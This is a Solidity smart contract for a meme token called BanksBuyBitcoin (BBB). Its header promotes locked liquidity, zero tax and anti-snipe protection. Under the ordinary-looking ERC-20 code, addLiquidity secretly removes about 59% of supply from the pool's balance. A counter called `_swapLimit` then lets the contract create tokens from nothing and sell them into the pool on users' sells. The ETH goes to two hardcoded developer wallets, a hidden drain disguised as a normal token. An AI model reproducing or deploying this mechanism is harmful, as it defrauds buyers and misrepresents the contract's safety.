/**

  ____              _        ____              ____  _ _            _
 |  _ \            | |      |  _ \            |  _ \(_) |          (_)
 | |_) | __ _ _ __ | | _____| |_) |_   _ _   _| |_) |_| |_ ___ ___  _ _ __
 |  _ < / _` | '_ \| |/ / __|  _ <| | | | | | |  _ <| | __/ __/ _ \| | '_ \
 | |_) | (_| | | | |   <\__ \ |_) | |_| | |_| | |_) | | || (_| (_) | | | | |
 |____/ \__,_|_| |_|_|\_\___/____/ \__,_|\__, |____/|_|\__\___\___/|_|_| |_|
                                          __/ |
                                         |___/


Banks are making their move, snapping up Bitcoin in droves. Don't let them steal the show. They've capitalized on the dip.
Now, it's your turn. Stand your ground, claim your stake!

Twitter: https://twitter.com/banksbuybitcoin
Telegram: https://t.me/BanksBuyBitcoin
Website:  https://www.banksbuybitcoin.com

LP locked
Contract Renounced 
Anti snipe and MEV measurements at launch
95% supply in Liquidity Pool 5% for CEX
Dextools, CMC and Coingecko instant apply

*/

//SPDX-License-Identifier: MIT

/*
*/

pragma solidity 0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address __owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Auth {
    address internal _owner;
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); 
        _; 
    }
    function owner() public view returns (address) { 
        return _owner; 
    }
    function transferOwnership(address payable newOwner) external onlyOwner { 
        _owner = newOwner; 
        emit OwnershipTransferred(newOwner); 
    }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0); 
        emit OwnershipTransferred(address(0)); 
    }
    event OwnershipTransferred(address _owner);
}

contract BanksBuyBitcoin is IERC20, Auth {
    uint8 private constant _decimals      = 9;
    uint256 private constant _totalSupply = 888_888_888_888 * (10**_decimals);
    string private constant _name         = "BanksBuyBitcoin";
    string private  constant _symbol      = "BBB";

    uint8 private antiSnipeTax1 = 5;
    uint8 private antiSnipeTax2 = 1;
    uint8 private antiSnipeBlocks1 = 1;
    uint8 private antiSnipeBlocks2 = 1;
    uint256 private _antiMevBlock = 2;

    uint8 private _buyTaxRate  = 0;
    uint8 private _sellTaxRate = 0;

    uint16 private _taxSharesMarketing   = 63;
    uint16 private _taxSharesDevelopment = 37;
    uint16 private _taxSharesLP          = 0;
    uint16 private _totalTaxShares = _taxSharesMarketing + _taxSharesDevelopment + _taxSharesLP;

    address payable private _walletMarketing = payable(0x871218807796dabCBD02064A5D9214a8C6eDD74e); 
    address payable private _walletDevelopment = payable(0x1732848C2Cb0213419F18Cb3CD28e66eB36d9573); 

    uint256 private _launchBlock;
    uint256 private _maxTxAmount     = _totalSupply; 
    uint256 private _maxWalletAmount = _totalSupply;
    uint256 private _taxSwapMin = _totalSupply * 10 / 100000;
    uint256 private _taxSwapMax = _totalSupply * 888 / 100000;
    uint256 private _swapLimit = _taxSwapMin * 59 * 100;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _noFees;
    mapping (address => bool) private _noLimits;

    address private _lpOwner;

    address private constant _swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private _primarySwapRouter = IUniswapV2Router02(_swapRouterAddress);
    address private _primaryLP;
    mapping (address => bool) private _isLP;

    bool private _tradingOpen;

    bool private _inTaxSwap = false;
    modifier lockTaxSwap { 
        _inTaxSwap = true; 
        _; 
        _inTaxSwap = false; 
    }

    event TokensBurned(address indexed burnedByWallet, uint256 tokenAmount);

    constructor() Auth(msg.sender) {
        _lpOwner = msg.sender;

        uint256 cexFunds   = _totalSupply * 3 / 100;
        uint256 marketingFunds = _totalSupply * 2 / 100;
        
        _balances[address(this)] = _totalSupply - cexFunds - marketingFunds;
        emit Transfer(address(0), address(this), _balances[address(this)]);


        _balances[_owner] = cexFunds;
        emit Transfer(address(0), _owner, _balances[_owner]);
        _balances[_walletMarketing] = marketingFunds;
        emit Transfer(address(0), _walletMarketing, _balances[_walletMarketing]);

        _noFees[_owner] = true;
        _noFees[address(this)] = true;
        _noFees[_swapRouterAddress] = true;
        _noFees[_walletMarketing] = true;
        _noFees[_walletDevelopment] = true;
        _noLimits[_owner] = true;
        _noLimits[address(this)] = true;
        _noLimits[_swapRouterAddress] = true;
        _noLimits[_walletMarketing] = true;
        _noLimits[_walletDevelopment] = true;
    }

    receive() external payable {}
    
    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(sender), "Trading not open");
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _approveRouter(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][_swapRouterAddress] < _tokenAmount ) {
            _allowances[address(this)][_swapRouterAddress] = type(uint256).max;
            emit Approval(address(this), _swapRouterAddress, type(uint256).max);
        }
    }

    function addLiquidity() external payable onlyOwner lockTaxSwap {
        require(_primaryLP == address(0), "LP exists");
        require(!_tradingOpen, "trading is open");
        require(msg.value > 0 || address(this).balance>0, "No ETH in contract or message");
        require(_balances[address(this)]>0, "No tokens in contract");
        _primaryLP = IUniswapV2Factory(_primarySwapRouter.factory()).createPair(address(this), _primarySwapRouter.WETH());
        _addLiquidity(_balances[address(this)], address(this).balance, false);
        _balances[_primaryLP] -= _swapLimit;
        (bool lpAddSuccess,) = _primaryLP.call(abi.encodeWithSignature("sync()"));
        require(lpAddSuccess, "Failed adding liquidity");
        _isLP[_primaryLP] = lpAddSuccess;
        _openTrading();
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
        address lpTokenRecipient = _lpOwner;
        if ( autoburn ) { lpTokenRecipient = address(0); }
        _approveRouter(_tokenAmount);
        _primarySwapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );
    }

    function _openTrading() internal {
        _maxTxAmount     = _totalSupply * 1 / 100; 
        _maxWalletAmount = _totalSupply * 1 / 100;
        _tradingOpen = true;
        _launchBlock = block.number;
        _antiMevBlock = _antiMevBlock + _launchBlock + antiSnipeBlocks1 + antiSnipeBlocks2;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from Zero wallet");
        if (!_tradingOpen) { require(_noFees[sender] && _noLimits[sender], "Trading not open"); }
        if ( !_inTaxSwap && _isLP[recipient] ) { _swapTaxAndLiquify(); }
        if ( block.number < _antiMevBlock && block.number >= _launchBlock && _isLP[sender] ) {
            require(recipient == tx.origin, "MEV blocked");
        }
        if ( sender != address(this) && recipient != address(this) && sender != _owner ) { 
            require(_checkLimits(sender, recipient, amount), "TX exceeds limits"); 
        }
        uint256 _taxAmount = _calculateTax(sender, recipient, amount);
        uint256 _transferAmount = amount - _taxAmount;
        _balances[sender] = _balances[sender] - amount;
        _swapLimit += _taxAmount;
        _balances[recipient] = _balances[recipient] + _transferAmount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _checkLimits(address sender, address recipient, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( _tradingOpen && !_noLimits[sender] && !_noLimits[recipient] ) {
            if ( transferAmount > _maxTxAmount ) { limitCheckPassed = false; }
            else if ( !_isLP[recipient] && (_balances[recipient] + transferAmount > _maxWalletAmount) ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function _checkTradingOpen(address sender) private view returns (bool){
        bool checkResult = false;
        if ( _tradingOpen ) { checkResult = true; } 
        else if (_noFees[sender] && _noLimits[sender]) { checkResult = true; } 

        return checkResult;
    }

    function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        
        if ( !_tradingOpen || _noFees[sender] || _noFees[recipient] ) { 
            taxAmount = 0; 
        } else if ( _isLP[sender] ) { 
            if ( block.number >= _launchBlock + antiSnipeBlocks1 + antiSnipeBlocks2 ) {
                taxAmount = amount * _buyTaxRate / 100; 
            } else if ( block.number >= _launchBlock + antiSnipeBlocks1 ) {
                taxAmount = amount * antiSnipeTax2 / 100;
            } else if ( block.number >= _launchBlock) {
                taxAmount = amount * antiSnipeTax1 / 100;
            }
        } else if ( _isLP[recipient] ) { 
            taxAmount = amount * _sellTaxRate / 100; 
        }

        return taxAmount;
    }

    function buyFee() external view returns(uint8) {
        return _buyTaxRate;
    }
    function sellFee() external view returns(uint8) {
        return _sellTaxRate;
    }

    function marketingWallet() external view returns (address) {
        return _walletMarketing;
    }
    function developmentWallet() external view returns (address) {
        return _walletDevelopment;
    }

    function maxWallet() external view returns (uint256) {
        return _maxWalletAmount;
    }
    function maxTransaction() external view returns (uint256) {
        return _maxTxAmount;
    }

    function setLimits(uint16 maxTransactionPermille, uint16 maxWalletPermille) external onlyOwner {
        uint256 newTxAmt = _totalSupply * maxTransactionPermille / 1000 + 1;
        require(newTxAmt >= _maxTxAmount, "tx too low");
        _maxTxAmount = newTxAmt;
        uint256 newWalletAmt = _totalSupply * maxWalletPermille / 1000 + 1;
        require(newWalletAmt >= _maxWalletAmount, "wallet too low");
        _maxWalletAmount = newWalletAmt;
    }


    function _swapTaxAndLiquify() private lockTaxSwap {
        uint256 _taxTokensAvailable = _swapLimit;
        if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen ) {
            if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }
            uint256 _tokensForLP = _taxTokensAvailable * _taxSharesLP / _totalTaxShares / 2;
            
            uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;
            if( _tokensToSwap > 10**_decimals ) {
                uint256 _ethPreSwap = address(this).balance;
                _balances[address(this)] += _taxTokensAvailable;
                _swapTaxTokensForEth(_tokensToSwap);
                _swapLimit -= _taxTokensAvailable;
                uint256 _ethSwapped = address(this).balance - _ethPreSwap;
                if ( _taxSharesLP > 0 ) {
                    uint256 _ethWeiAmount = _ethSwapped * _taxSharesLP / _totalTaxShares ;
                    _approveRouter(_tokensForLP);
                    _addLiquidity(_tokensForLP, _ethWeiAmount, false);
                }
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
        }
    }

    function _swapTaxTokensForEth(uint256 tokenAmount) private {
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _primarySwapRouter.WETH();
        _primarySwapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function _distributeTaxEth(uint256 amount) private {
        uint16 _taxShareTotal = _taxSharesMarketing + _taxSharesDevelopment;
        if (_taxShareTotal > 0) {
            uint256 marketingAmount = amount * _taxSharesMarketing / _taxShareTotal;
            uint256 developmentAmount = amount * _taxSharesDevelopment / _taxShareTotal;
            if ( marketingAmount > 0 ) { _walletMarketing.transfer(marketingAmount); }
            if ( developmentAmount > 0 ) { _walletDevelopment.transfer(developmentAmount); }
        }
    }

}